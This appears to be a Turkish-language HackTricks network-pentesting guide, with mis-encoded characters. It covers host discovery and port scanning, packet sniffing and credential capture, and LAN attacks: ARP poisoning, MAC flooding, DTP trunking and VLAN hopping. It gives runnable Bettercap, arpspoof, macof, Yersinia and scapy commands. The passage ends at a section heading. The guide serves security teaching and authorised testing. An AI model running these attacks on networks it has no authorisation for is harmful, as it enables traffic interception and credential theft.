# AÄŸÄ±n Pentest Edilmesi

<details>

<summary><strong>SÄ±fÄ±rdan kahraman olacak ÅŸekilde AWS hacklemeyi Ã¶ÄŸrenin</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

HackTricks'Ä± desteklemenin diÄŸer yollarÄ±:

* **Åirketinizi HackTricks'te reklamÄ±nÄ± gÃ¶rmek istiyorsanÄ±z** veya **HackTricks'i PDF olarak indirmek istiyorsanÄ±z** [**ABONELÄ°K PLANLARI'na**](https://github.com/sponsors/carlospolop) gÃ¶z atÄ±n!
* [**Resmi PEASS & HackTricks Ã¼rÃ¼nlerini keÅŸfedin**](https://peass.creator-spring.com)
* [**The PEASS Family'yi**](https://opensea.io/collection/the-peass-family) keÅŸfedin, Ã¶zel [**NFT'lerimiz**](https://opensea.io/collection/the-peass-family) koleksiyonumuz
* **KatÄ±lÄ±n** ğŸ’¬ [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) veya bizi **Twitter** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**'da takip edin.**
* **Hacking pÃ¼f noktalarÄ±nÄ±zÄ± paylaÅŸarak PR gÃ¶ndererek HackTricks** ve [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github depolarÄ±na katkÄ±da bulunun.

</details>

<img src="../../.gitbook/assets/i3.png" alt="" data-size="original">\
**Hata avcÄ±lÄ±ÄŸÄ± ipucu**: **Intigriti'ye kaydolun**, hackerlar tarafÄ±ndan oluÅŸturulan bir premium **hata avcÄ±lÄ±ÄŸÄ± platformu**! BugÃ¼n bize [**https://go.intigriti.com/hacktricks**](https://go.intigriti.com/hacktricks) adresinden katÄ±lÄ±n ve **$100,000**'a kadar Ã¶dÃ¼ller kazanmaya baÅŸlayÄ±n!

{% embed url="https://go.intigriti.com/hacktricks" %}

## DÄ±ÅŸarÄ±dan Ana BilgisayarlarÄ± KeÅŸfetme

Bu, **Ä°nternet'ten yanÄ±t veren IP'leri bulmanÄ±n** kÄ±sa bir bÃ¶lÃ¼mÃ¼ olacak.\
Bu durumda birkaÃ§ **IP kapsamÄ±nÄ±z** var (belki hatta birkaÃ§ **aralÄ±k**) ve sadece **hangi IP'lerin yanÄ±t verdiÄŸini bulmanÄ±z gerekiyor**.

### ICMP

Bu, bir ana bilgisayarÄ±n Ã§alÄ±ÅŸÄ±p Ã§alÄ±ÅŸmadÄ±ÄŸÄ±nÄ± keÅŸfetmenin **en kolay** ve **en hÄ±zlÄ±** yoludur.\
BazÄ± **ICMP** paketleri gÃ¶ndermeyi deneyebilir ve **yanÄ±t bekleyebilirsiniz**. En kolay yol, sadece bir **echo isteÄŸi** gÃ¶ndermek ve yanÄ±t beklemektir. Bunun iÃ§in basit bir `ping` veya **aralÄ±klar** iÃ§in `fping` kullanabilirsiniz.\
AyrÄ±ca **nmap**'Ä± kullanarak diÄŸer tÃ¼rde ICMP paketleri gÃ¶nderebilirsiniz (bu, yaygÄ±n ICMP echo isteÄŸi-yanÄ±tÄ±na filtrelerden kaÃ§Ä±nmanÄ±za yardÄ±mcÄ± olacaktÄ±r).
```bash
ping -c 1 199.66.11.4    # 1 echo request to a host
fping -g 199.66.11.0/24  # Send echo requests to ranges
nmap -PE -PM -PP -sn -n 199.66.11.0/24 #Send echo, timestamp requests and subnet mask requests
```
### TCP Port KeÅŸfi

Ã‡oÄŸu zaman tÃ¼m tÃ¼rden ICMP paketlerinin filtrelenmiÅŸ olduÄŸunu gÃ¶rmek oldukÃ§a yaygÄ±ndÄ±r. ArdÄ±ndan, bir ana bilgisayarÄ±n aÃ§Ä±k olup olmadÄ±ÄŸÄ±nÄ± kontrol etmek iÃ§in yapabileceÄŸiniz tek ÅŸey **aÃ§Ä±k portlarÄ± bulmaya Ã§alÄ±ÅŸmaktÄ±r**. Her bir ana bilgisayarÄ±n **65535 portu** vardÄ±r, bu nedenle, "bÃ¼yÃ¼k" bir kapsama sahipseniz **her portu** her bir ana bilgisayarÄ±n aÃ§Ä±k olup olmadÄ±ÄŸÄ±nÄ± test edemezsiniz, bu Ã§ok fazla zaman alacaktÄ±r.\
Bu durumda ihtiyacÄ±nÄ±z olan ÅŸey, hÄ±zlÄ± bir port tarama aracÄ± ([masscan](https://github.com/robertdavidgraham/masscan)) ve **daha sÄ±k kullanÄ±lan portlarÄ±n** bir listesidir:
```bash
#Using masscan to scan top20ports of nmap in a /24 range (less than 5min)
masscan -p20,21-23,25,53,80,110,111,135,139,143,443,445,993,995,1723,3306,3389,5900,8080 199.66.11.0/24
```
### HTTP Port Discovery

Bu, **HTTP hizmetlerini keÅŸfetmeye odaklanmak istediÄŸinizde** yararlÄ± olan sadece bir TCP baÄŸlantÄ± noktasÄ± keÅŸfidir.
```bash
masscan -p80,443,8000-8100,8443 199.66.11.0/24
```
### UDP Port KeÅŸfi

AyrÄ±ca, bir **ana bilgisayara** daha fazla **dikkat etmeniz gerekip gerekmediÄŸine** karar vermek iÃ§in **aÃ§Ä±k UDP portlarÄ±nÄ±** kontrol etmeyi deneyebilirsiniz. UDP hizmetleri genellikle **dÃ¼zenli boÅŸ bir UDP sorgu paketine** herhangi bir veri ile yanÄ±t vermediÄŸinden, bir portun filtrelenip aÃ§Ä±k olup olmadÄ±ÄŸÄ±nÄ± sÃ¶ylemek zordur. Bu durumu belirlemenin en kolay yolu, Ã§alÄ±ÅŸan hizmetle ilgili bir paket gÃ¶ndermektir ve hangi hizmetin Ã§alÄ±ÅŸtÄ±ÄŸÄ±nÄ± bilmediÄŸinizden, muhtemelen port numarasÄ±na dayanarak en olasÄ± hizmeti denemelisiniz:
```bash
nmap -sU -sV --version-intensity 0 -F -n 199.66.11.53/24
# The -sV will make nmap test each possible known UDP service packet
# The "--version-intensity 0" will make nmap only test the most probable
```
Ã–nerilen nmap komutu Ã¶ncekiyle aynÄ±dÄ±r, her bir **/24** aralÄ±ÄŸÄ±ndaki her ana makinede **top 1000 UDP portunu** test edecektir, ancak yalnÄ±zca bu iÅŸlem **>20dk** sÃ¼recektir. Daha **hÄ±zlÄ± sonuÃ§lar** gerekiyorsa [**udp-proto-scanner**](https://github.com/portcullislabs/udp-proto-scanner) kullanabilirsiniz: `./udp-proto-scanner.pl 199.66.11.53/24` Bu, bu **UDP sorgularÄ±nÄ±** beklenen baÄŸlantÄ± noktalarÄ±na gÃ¶nderecektir (/24 aralÄ±ÄŸÄ± iÃ§in bu yalnÄ±zca 1 dakika sÃ¼recektir): _DNSStatusRequest, DNSVersionBindReq, NBTStat, NTPRequest, RPCCheck, SNMPv3GetRequest, chargen, citrix, daytime, db2, echo, gtpv1, ike,ms-sql, ms-sql-slam, netop, ntp, rpc, snmp-public, systat, tftp, time, xdmcp._

### SCTP Port KeÅŸfi
```bash
#Probably useless, but it's pretty fast, why not trying?
nmap -T4 -sY -n --open -Pn <IP/range>
```
## Wifi Pentest

Ä°ÅŸte yazÄ±ldÄ±ÄŸÄ± zaman bilinen tÃ¼m Wifi saldÄ±rÄ±larÄ±nÄ±n gÃ¼zel bir rehberini bulabilirsiniz:

{% content-ref url="../pentesting-wifi/" %}
[pentesting-wifi](../pentesting-wifi/)
{% endcontent-ref %}

## Ä°Ã§eriden HostlarÄ± KeÅŸfetme

AÄŸÄ±n iÃ§indeyseniz yapmak isteyeceÄŸiniz ilk ÅŸeylerden biri **diÄŸer hostlarÄ± keÅŸfetmek** olacaktÄ±r. **Ne kadar gÃ¼rÃ¼ltÃ¼** yapmak istediÄŸinize baÄŸlÄ± olarak, farklÄ± eylemler gerÃ§ekleÅŸtirilebilir:

### Pasif

BaÄŸlÄ± bir aÄŸ iÃ§indeki hostlarÄ± pasif olarak keÅŸfetmek iÃ§in bu araÃ§larÄ± kullanabilirsiniz:
```bash
netdiscover -p
p0f -i eth0 -p -o /tmp/p0f.log
# Bettercap
net.recon on/off #Read local ARP cache periodically
net.show
set net.show.meta true #more info
```
### Aktif

DÄ±ÅŸarÄ±dan _**Ana bilgisayarlarÄ± keÅŸfetme**_ baÅŸlÄ±ÄŸÄ±ndaki (_TCP/HTTP/UDP/SCTP Port KeÅŸfi_) tekniklerin burada da **uygulanabileceÄŸini** unutmayÄ±n.\
Ancak, diÄŸer ana bilgisayarlarla **aynÄ± aÄŸda** olduÄŸunuzdan dolayÄ±, daha fazla ÅŸey yapabilirsiniz:
```bash
#ARP discovery
nmap -sn <Network> #ARP Requests (Discover IPs)
netdiscover -r <Network> #ARP requests (Discover IPs)

#NBT discovery
nbtscan -r 192.168.0.1/24 #Search in Domain

# Bettercap
net.probe on/off #Discover hosts on current subnet by probing with ARP, mDNS, NBNS, UPNP, and/or WSD
set net.probe.mdns true/false #Enable mDNS discovery probes (default=true)
set net.probe.nbns true/false #Enable NetBIOS name service discovery probes (default=true)
set net.probe.upnp true/false #Enable UPNP discovery probes (default=true)
set net.probe.wsd true/false #Enable WSD discovery probes (default=true)
set net.probe.throttle 10 #10ms between probes sent (default=10)

#IPv6
alive6 <IFACE> # Send a pingv6 to multicast.
```
### Aktif ICMP

_Tekniklerin dÄ±ÅŸarÄ±dan ana bilgisayarlarÄ± keÅŸfetme_ bÃ¶lÃ¼mÃ¼nde (_**ICMP**_)(./#icmp) yorumlanan teknikler de **burada uygulanabilir**.\
Ancak, diÄŸer ana bilgisayarlarla **aynÄ± aÄŸda** olduÄŸunuzdan, **daha fazla ÅŸey yapabilirsiniz**:

* EÄŸer bir **alt aÄŸ yayÄ±n adresine ping atarsanÄ±z**, ping her bir ana bilgisayara ulaÅŸmalÄ± ve onlar da size **yanÄ±t verebilirler**: `ping -b 10.10.5.255`
* AÄŸ yayÄ±n adresine ping atarak, **diÄŸer alt aÄŸlardaki ana bilgisayarlarÄ± bile bulabilirsiniz**: `ping -b 255.255.255.255`
* `nmap`'in `-PE`, `-PP`, `-PM` bayraklarÄ±nÄ± kullanarak sÄ±rasÄ±yla **ICMPv4 echo**, **zaman damgasÄ±** ve **alt aÄŸ maskesi istekleri** gÃ¶ndererek ana bilgisayar keÅŸfi yapabilirsiniz: `nmap -PE -PM -PP -sn -vvv -n 10.12.5.0/24`

### **Wake On Lan**

Wake On Lan, bilgisayarlarÄ± bir **aÄŸ ileti**si aracÄ±lÄ±ÄŸÄ±yla **aÃ§mak** iÃ§in kullanÄ±lÄ±r. BilgisayarÄ± aÃ§mak iÃ§in kullanÄ±lan sihirli paket, yalnÄ±zca bir **MAC Dst** saÄŸlandÄ±ÄŸÄ± ve ardÄ±ndan aynÄ± paket iÃ§inde **16 kez tekrarlandÄ±ÄŸÄ± bir pakettir.\
Bu tÃ¼r paketler genellikle bir **eternet 0x0842** veya **9 numaralÄ± baÄŸlantÄ± noktasÄ±na UDP paketi** iÃ§inde gÃ¶nderilir.\
EÄŸer **bir \[MAC]** saÄŸlanmazsa, paket **yayÄ±n eternetine** gÃ¶nderilir (ve tekrarlanan MAC yayÄ±n MAC olacaktÄ±r).
```bash
# Bettercap (if no [MAC] is specificed ff:ff:ff:ff:ff:ff will be used/entire broadcast domain)
wol.eth [MAC] #Send a WOL as a raw ethernet packet of type 0x0847
wol.udp [MAC] #Send a WOL as an IPv4 broadcast packet to UDP port 9
```
## HostlarÄ± Tarama

Taramak istediÄŸiniz tÃ¼m IP'leri (harici veya dahili) keÅŸfettikten sonra, farklÄ± iÅŸlemler gerÃ§ekleÅŸtirilebilir.

### TCP

* **AÃ§Ä±k** port: _SYN --> SYN/ACK --> RST_
* **KapalÄ±** port: _SYN --> RST/ACK_
* **FiltrelenmiÅŸ** port: _SYN --> \[YANIT YOK]_
* **FiltrelenmiÅŸ** port: _SYN --> ICMP mesajÄ±_
```bash
# Nmap fast scan for the most 1000tcp ports used
nmap -sV -sC -O -T4 -n -Pn -oA fastscan <IP>
# Nmap fast scan for all the ports
nmap -sV -sC -O -T4 -n -Pn -p- -oA fullfastscan <IP>
# Nmap fast scan for all the ports slower to avoid failures due to -T4
nmap -sV -sC -O -p- -n -Pn -oA fullscan <IP>

#Bettercap Scan
syn.scan 192.168.1.0/24 1 10000 #Ports 1-10000
```
### UDP

Bir UDP portunu taramanÄ±n 2 seÃ§eneÄŸi vardÄ±r:

* Bir **UDP paketi** gÃ¶nderin ve port **kapalÄ±** ise yanÄ±t olarak _**ICMP ulaÅŸÄ±lamaz**_ kontrol edin (birÃ§ok durumda ICMP **filtrelenmiÅŸ** olabilir, bu yÃ¼zden port kapalÄ± veya aÃ§Ä±k olduÄŸunda herhangi bir bilgi alamayabilirsiniz).
* Bir **hizmetten** yanÄ±t almak iÃ§in **biÃ§imlendirilmiÅŸ datagramlar** gÃ¶nderin (Ã¶rneÄŸin, DNS, DHCP, TFTP ve diÄŸerleri, _nmap-payloads_ iÃ§inde listelenmiÅŸtir). Bir **yanÄ±t** alÄ±rsanÄ±z, o zaman port **aÃ§Ä±ktÄ±r**.

**Nmap**, "-sV" kullanarak **her ikisini de** karÄ±ÅŸtÄ±racaktÄ±r (UDP taramalarÄ± Ã§ok yavaÅŸtÄ±r), ancak UDP taramalarÄ±nÄ±n TCP taramalarÄ±ndan daha yavaÅŸ olduÄŸunu unutmayÄ±n:
```bash
# Check if any of the most common udp services is running
udp-proto-scanner.pl <IP>
# Nmap fast check if any of the 100 most common UDP services is running
nmap -sU -sV --version-intensity 0 -n -F -T4 <IP>
# Nmap check if any of the 100 most common UDP services is running and launch defaults scripts
nmap -sU -sV -sC -n -F -T4 <IP>
# Nmap "fast" top 1000 UDP ports
nmap -sU -sV --version-intensity 0 -n -T4 <IP>
# You could use nmap to test all the UDP ports, but that will take a lot of time
```
### SCTP TaramasÄ±

**SCTP (AkÄ±ÅŸ Kontrol AktarÄ±m ProtokolÃ¼)**, **TCP (AktarÄ±m Kontrol ProtokolÃ¼)** ve **UDP (KullanÄ±cÄ± Datagram ProtokolÃ¼)** ile birlikte kullanÄ±lmak Ã¼zere tasarlanmÄ±ÅŸtÄ±r. Temel amacÄ±, telekomÃ¼nikasyon verilerinin IP aÄŸlarÄ± Ã¼zerinden taÅŸÄ±nmasÄ±nÄ± kolaylaÅŸtÄ±rmaktÄ±r ve **SS7 (Sinyalizasyon Sistemi 7)**'de bulunan birÃ§ok gÃ¼venilirlik Ã¶zelliÄŸini yansÄ±tmaktadÄ±r. **SCTP**, SS7 sinyallerini IP aÄŸlarÄ± Ã¼zerinden taÅŸÄ±mak amacÄ±yla geliÅŸtirilen **SIGTRAN** protokol ailesinin temel bir bileÅŸenidir.

**SCTP** desteÄŸi, **IBM AIX**, **Oracle Solaris**, **HP-UX**, **Linux**, **Cisco IOS** ve **VxWorks** gibi Ã§eÅŸitli iÅŸletim sistemleri tarafÄ±ndan saÄŸlanmaktadÄ±r, bu da telekomÃ¼nikasyon ve aÄŸ alanÄ±nda geniÅŸ kabul gÃ¶rdÃ¼ÄŸÃ¼nÃ¼ ve kullanÄ±ÅŸlÄ± olduÄŸunu gÃ¶stermektedir.

Nmap tarafÄ±ndan **SCTP** iÃ§in sunulan iki farklÄ± tarama seÃ§eneÄŸi vardÄ±r: _-sY_ ve _-sZ_
```bash
# Nmap fast SCTP scan
nmap -T4 -sY -n -oA SCTFastScan <IP>
# Nmap all SCTP scan
nmap -T4 -p- -sY -sV -sC -F -n -oA SCTAllScan <IP>
```
### IDS ve IPS kaÃ§Ä±nma

{% content-ref url="ids-evasion.md" %}
[ids-evasion.md](ids-evasion.md)
{% endcontent-ref %}

### **Daha fazla nmap seÃ§eneÄŸi**

{% content-ref url="nmap-summary-esp.md" %}
[nmap-summary-esp.md](nmap-summary-esp.md)
{% endcontent-ref %}

### Dahili IP Adreslerinin Ortaya Ã‡Ä±karÄ±lmasÄ±

**HatalÄ± yapÄ±landÄ±rÄ±lmÄ±ÅŸ yÃ¶nlendiriciler, gÃ¼venlik duvarlarÄ± ve aÄŸ cihazlarÄ±** bazen **kamu dÄ±ÅŸÄ± kaynak adresleri** kullanarak aÄŸ taramalarÄ±na yanÄ±t verir. **tcpdump** test sÄ±rasÄ±nda Ã¶zel adreslerden gelen paketleri tanÄ±mlamak iÃ§in kullanÄ±labilir. Ã–zellikle Kali Linux'ta, paketler **genel Ä°nternet'ten eriÅŸilebilen eth2 arabiriminde** yakalanabilir. Kurulumunuzun bir NAT veya bir GÃ¼venlik DuvarÄ± arkasÄ±nda olduÄŸunu unutmamak Ã¶nemlidir, bu tÃ¼r paketlerin muhtemelen filtrelenmiÅŸ olacaÄŸÄ±nÄ± unutmamak Ã¶nemlidir.
```bash
tcpdump â€“nt -i eth2 src net 10 or 172.16/12 or 192.168/16
tcpdump: verbose output suppressed, use -v or -vv for full protocol decode
listening on eth2, link-type EN10MB (Ethernet), capture size 65535 bytes
IP 10.10.0.1 > 185.22.224.18: ICMP echo reply, id 25804, seq 1582, length 64
IP 10.10.0.2 > 185.22.224.18: ICMP echo reply, id 25804, seq 1586, length 64
```
## Sniffing

Sniffing, yakalanan Ã§erÃ§eveler ve paketleri inceleyerek IP aralÄ±klarÄ±nÄ±n, alt aÄŸ boyutlarÄ±nÄ±n, MAC adreslerinin ve ana bilgisayar adlarÄ±nÄ±n ayrÄ±ntÄ±larÄ±nÄ± Ã¶ÄŸrenebilirsiniz. AÄŸ yanlÄ±ÅŸ yapÄ±landÄ±rÄ±lmÄ±ÅŸsa veya anahtarlama kumaÅŸÄ± stres altÄ±ndaysa, saldÄ±rganlar pasif aÄŸ dinleme yoluyla hassas materyalleri yakalayabilirler.

EÄŸer anahtarlanmÄ±ÅŸ bir Ethernet aÄŸÄ± doÄŸru ÅŸekilde yapÄ±landÄ±rÄ±lmÄ±ÅŸsa, yalnÄ±zca yayÄ±n Ã§erÃ§evelerini ve MAC adresiniz iÃ§in belirlenmiÅŸ materyalleri gÃ¶receksiniz.

### TCPDump
```bash
sudo tcpdump -i <INTERFACE> udp port 53 #Listen to DNS request to discover what is searching the host
tcpdump -i <IFACE> icmp #Listen to icmp packets
sudo bash -c "sudo nohup tcpdump -i eth0 -G 300 -w \"/tmp/dump-%m-%d-%H-%M-%S-%s.pcap\" -W 50 'tcp and (port 80 or port 443)' &"
```
AyrÄ±ca, Wireshark'Ä± GUI olarak kullanarak bir SSH oturumu Ã¼zerinden uzaktaki bir makineden paketleri gerÃ§ek zamanlÄ± olarak yakalayabilirsiniz.
```
ssh user@<TARGET IP> tcpdump -i ens160 -U -s0 -w - | sudo wireshark -k -i -
ssh <USERNAME>@<TARGET IP> tcpdump -i <INTERFACE> -U -s0 -w - 'port not 22' | sudo wireshark -k -i - # Exclude SSH traffic
```
### Bettercap

### Bettercap
```bash
net.sniff on
net.sniff stats
set net.sniff.output sniffed.pcap #Write captured packets to file
set net.sniff.local  #If true it will consider packets from/to this computer, otherwise it will skip them (default=false)
set net.sniff.filter #BPF filter for the sniffer (default=not arp)
set net.sniff.regexp #If set only packets matching this regex will be considered
```
### Wireshark

AÃ§Ä±k.

### Kimlik bilgilerini yakalama

[https://github.com/lgandx/PCredz](https://github.com/lgandx/PCredz) gibi araÃ§larÄ± kullanarak kimlik bilgilerini bir pcap dosyasÄ±ndan veya canlÄ± bir arayÃ¼zden ayrÄ±ÅŸtÄ±rabilirsiniz.

## LAN saldÄ±rÄ±larÄ±

### ARP zehirlemesi

ARP Zehirlemesi, bir makinenin IP'sinin MAC adresinin cihazÄ±mÄ±zÄ±n MAC adresi olduÄŸunu belirten gereksiz ARP yanÄ±tlarÄ± gÃ¶ndermekten oluÅŸur. ArdÄ±ndan, kurban ARP tablosunu deÄŸiÅŸtirir ve sahte IP'yi iletmek istediÄŸinde her zaman cihazÄ±mÄ±za baÅŸvurur.

#### **Bettercap**
```bash
arp.spoof on
set arp.spoof.targets <IP> #Specific targets to ARP spoof (default=<entire subnet>)
set arp.spoof.whitelist #Specific targets to skip while spoofing
set arp.spoof.fullduplex true #If true, both the targets and the gateway will be attacked, otherwise only the target (default=false)
set arp.spoof.internal true #If true, local connections among computers of the network will be spoofed, otherwise only connections going to and coming from the Internet (default=false)
```
#### **Arpspoof**
```bash
echo 1 > /proc/sys/net/ipv4/ip_forward
arpspoof -t 192.168.1.1 192.168.1.2
arpspoof -t 192.168.1.2 192.168.1.1
```
### MAC Flooding - CAM taÅŸmasÄ±

AnahtarlamanÄ±n CAM tablosunu aÅŸÄ±rÄ± doldurarak farklÄ± kaynak MAC adresleriyle birÃ§ok paket gÃ¶nderin. CAM tablosu dolu olduÄŸunda anahtar, tÃ¼m trafiÄŸi yayÄ±nlayan bir hub gibi davranmaya baÅŸlar.
```bash
macof -i <interface>
```
Modern anahtarlar bu zafiyeti gidermiÅŸtir.

### 802.1Q VLAN / DTP SaldÄ±rÄ±larÄ±

#### Dinamik Trunking

**Dinamik Trunking ProtokolÃ¼ (DTP)**, anahtar katman protokolÃ¼ olarak tasarlanmÄ±ÅŸtÄ±r ve anahtarlamayÄ± otomatikleÅŸtiren bir sistem saÄŸlar, anahtarlarÄ±n otomatik olarak baÄŸlantÄ± noktalarÄ±nÄ± trunk modu (Trunk) veya non-trunk moduna seÃ§melerine izin verir. **DTP**'nin kullanÄ±mÄ± genellikle alt-optimal aÄŸ tasarÄ±mÄ±nÄ±n bir gÃ¶stergesi olarak gÃ¶rÃ¼lÃ¼r, bu da trunk'larÄ± yalnÄ±zca gerekli olduÄŸu yerlerde manuel olarak yapÄ±landÄ±rmanÄ±n ve uygun belgelemenin saÄŸlanmasÄ±nÄ±n Ã¶nemini vurgular.

VarsayÄ±lan olarak, anahtar baÄŸlantÄ± noktalarÄ± Dinamik Otomatik modunda Ã§alÄ±ÅŸacak ÅŸekilde ayarlanmÄ±ÅŸtÄ±r, yani komÅŸu bir anahtar tarafÄ±ndan teÅŸvik edilirse trunking'i baÅŸlatmaya hazÄ±rdÄ±rlar. Bir gÃ¼venlik endiÅŸesi, bir pentester veya saldÄ±rganÄ±n anahtara baÄŸlanÄ±p bir DTP Ä°stenen Ã§erÃ§eve gÃ¶nderdiÄŸinde ortaya Ã§Ä±kar, bu da baÄŸlantÄ± noktasÄ±nÄ±n trunk moduna girmesini saÄŸlar. Bu eylem saldÄ±rganÄ±n STP Ã§erÃ§eve analizi aracÄ±lÄ±ÄŸÄ±yla VLAN'larÄ± numaralandÄ±rmasÄ±na ve sanal arayÃ¼zler kurarak VLAN segmentasyonunu atlamasÄ±na olanak tanÄ±r.

BirÃ§ok anahtarÄ±n varsayÄ±lan olarak DTP'yi iÃ§ermesi, saldÄ±rganlarÄ±n bir anahtarÄ±n davranÄ±ÅŸÄ±nÄ± taklit ederek tÃ¼m VLAN'lardaki trafiÄŸe eriÅŸim kazanmasÄ±nÄ± saÄŸlayabilir. _**dtpscan.sh**_ betiÄŸi, bir arabirimi izlemek iÃ§in kullanÄ±lÄ±r ve bir anahtarÄ±n VarsayÄ±lan, Trunk, Dinamik, Otomatik veya EriÅŸim modunda olup olmadÄ±ÄŸÄ±nÄ± ortaya Ã§Ä±karÄ±r - sonuncusu VLAN atlama saldÄ±rÄ±larÄ±na karÅŸÄ± baÄŸÄ±ÅŸÄ±k tek yapÄ±landÄ±rmadÄ±r. Bu araÃ§, anahtarÄ±n zafiyet durumunu deÄŸerlendirir.

AÄŸ zafiyetinin belirlenmesi durumunda, _**Yersinia**_ aracÄ±, DTP protokolÃ¼ aracÄ±lÄ±ÄŸÄ±yla "trunking'i etkinleÅŸtirmek" iÃ§in kullanÄ±labilir, bÃ¶ylece tÃ¼m VLAN'lardan paketlerin gÃ¶zlemlenmesine olanak tanÄ±r.
```bash
apt-get install yersinia #Installation
sudo apt install kali-linux-large #Another way to install it in Kali
yersinia -I #Interactive mode
#In interactive mode you will need to select a interface first
#Then, you can select the protocol to attack using letter "g"
#Finally, you can select the attack using letter "x"

yersinia -G #For graphic mode
```
![](<../../.gitbook/assets/image (269).png>)

VLAN'larÄ± numaralandÄ±rmak iÃ§in [**DTPHijacking.py**](https://github.com/in9uz/VLANPWN/blob/main/DTPHijacking.py)** betiÄŸi ile DTP Ä°stenen Ã§erÃ§eve oluÅŸturmak da mÃ¼mkÃ¼ndÃ¼r.** BetiÄŸi hiÃ§bir durumda kesmeyin. **Her Ã¼Ã§ saniyede bir DTP Ä°stenen enjekte eder.** **Anahtar Ã¼zerinde dinamik olarak oluÅŸturulan kiriÅŸ kanallarÄ± sadece beÅŸ dakika boyunca yaÅŸar. BeÅŸ dakika sonra kiriÅŸ dÃ¼ÅŸer.**
```
sudo python3 DTPHijacking.py --interface eth0
```
**EriÅŸim/Ä°stenilen (0x03)** ifadesi, DTP Ã§erÃ§evesinin Ä°stenilen tÃ¼rde olduÄŸunu ve baÄŸlantÄ± noktasÄ±na Trunk moduna geÃ§mesini sÃ¶ylediÄŸini belirtir. Ve **802.1Q/802.1Q (0xa5)**, **802.1Q** kapsÃ¼lleme tÃ¼rÃ¼nÃ¼ belirtir.

STP Ã§erÃ§evelerini analiz ederek, **VLAN 30 ve VLAN 60'Ä±n varlÄ±ÄŸÄ±nÄ± Ã¶ÄŸreniriz.**

<figure><img src="../../.gitbook/assets/image (124).png" alt=""><figcaption></figcaption></figure>

#### Belirli VLAN'larÄ± Hedefleme

VLAN Kimlikleri ve IP deÄŸerlerini bildiÄŸinizde, **belirli bir VLAN'Ä± hedeflemek iÃ§in sanal bir arayÃ¼z yapÄ±landÄ±rabilirsiniz**.\
DHCP mevcut deÄŸilse, statik bir IP adresi ayarlamak iÃ§in _ifconfig_ kullanÄ±n.
```
root@kali:~# modprobe 8021q
root@kali:~# vconfig add eth1 250
Added VLAN with VID == 250 to IF -:eth1:-
root@kali:~# dhclient eth1.250
Reloading /etc/samba/smb.conf: smbd only.
root@kali:~# ifconfig eth1.250
eth1.250  Link encap:Ethernet  HWaddr 00:0e:c6:f0:29:65
inet addr:10.121.5.86  Bcast:10.121.5.255  Mask:255.255.255.0
inet6 addr: fe80::20e:c6ff:fef0:2965/64 Scope:Link
UP BROADCAST RUNNING MULTICAST  MTU:1500  Metric:1
RX packets:19 errors:0 dropped:0 overruns:0 frame:0
TX packets:13 errors:0 dropped:0 overruns:0 carrier:0
collisions:0 txqueuelen:0
RX bytes:2206 (2.1 KiB)  TX bytes:1654 (1.6 KiB)

root@kali:~# arp-scan -I eth1.250 10.121.5.0/24
```

```bash
# Another configuration example
modprobe 8021q
vconfig add eth1 20
ifconfig eth1.20 192.168.1.2 netmask 255.255.255.0 up
```

```bash
# Another configuration example
sudo vconfig add eth0 30
sudo ip link set eth0.30 up
sudo dhclient -v eth0.30
```
#### Otomatik VLAN Atlama

TartÄ±ÅŸÄ±lan **Dinamik Trunking ve sanal arayÃ¼zler oluÅŸturma ve diÄŸer VLAN'lerdeki ana bilgisayarlarÄ± keÅŸfetme** saldÄ±rÄ±sÄ±, [**https://github.com/nccgroup/vlan-hopping---frogger**](https://github.com/nccgroup/vlan-hopping---frogger) aracÄ± tarafÄ±ndan **otomatik olarak gerÃ§ekleÅŸtirilir**.

#### Ã‡ift Etiketleme

Bir saldÄ±rgan, **kurban ana bilgisayarÄ±n MAC, IP ve VLAN kimliÄŸi deÄŸerlerini** bildiÄŸinde, belirlenen VLAN ve kurbanÄ±n VLAN'Ä± ile bir Ã§erÃ§eveyi **Ã§ift etiketleyebilir ve bir paket gÃ¶nderebilir**. **Kurban saldÄ±rganla geri baÄŸlantÄ± kuramayacaÄŸÄ±ndan**, saldÄ±rgan iÃ§in **en iyi seÃ§enek UDP Ã¼zerinden iletiÅŸim kurmaktÄ±r** ve ilginÃ§ eylemler gerÃ§ekleÅŸtirebilen protokollere (Ã¶rneÄŸin SNMP) eriÅŸebilir.

SaldÄ±rganÄ±n baÅŸka bir seÃ§eneÄŸi, saldÄ±rgan tarafÄ±ndan kontrol edilen ve kurban tarafÄ±ndan eriÅŸilebilen bir IP'yi taklit ederek **TCP port taramasÄ± baÅŸlatmaktÄ±r** (muhtemelen internet aracÄ±lÄ±ÄŸÄ±yla). Daha sonra, saldÄ±rgan, ikinci ana bilgisayarÄ±nda kurbandan gelen bazÄ± paketleri alÄ±p almadÄ±ÄŸÄ±nÄ± izleyebilir.

Bu saldÄ±rÄ±yÄ± gerÃ§ekleÅŸtirmek iÃ§in scapy kullanabilirsiniz: `pip install scapy`
```python
from scapy.all import *
# Double tagging with ICMP packet (the response from the victim isn't double tagged so it will never reach the attacker)
packet = Ether()/Dot1Q(vlan=1)/Dot1Q(vlan=20)/IP(dst='192.168.1.10')/ICMP()
sendp(packet)
```
#### Yan Yana VLAN Segmentasyonunu Atlatma <a href="#d679" id="d679"></a>

EÄŸer **doÄŸrudan baÄŸlÄ± olduÄŸunuz bir anahtara eriÅŸiminiz varsa**, aÄŸ iÃ§inde **VLAN segmentasyonunu atlayabilirsiniz**. BasitÃ§e portu trunk moduna (diÄŸer adÄ±yla trunk) geÃ§irin, hedef VLAN'larÄ±n kimlikleriyle sanal arayÃ¼zler oluÅŸturun ve bir IP adresi yapÄ±landÄ±rÄ±n. IP adresini dinamik olarak (DHCP) talep edebilir veya statik olarak yapÄ±landÄ±rabilirsiniz. Duruma baÄŸlÄ±dÄ±r.

{% content-ref url="lateral-vlan-segmentation-bypass.md" %}
[lateral-vlan-segmentation-bypass.md](lateral-vlan-segmentation-bypass.md)
{% endcontent-ref %}

#### Katman 3 Ã–zel VLAN Atlatma

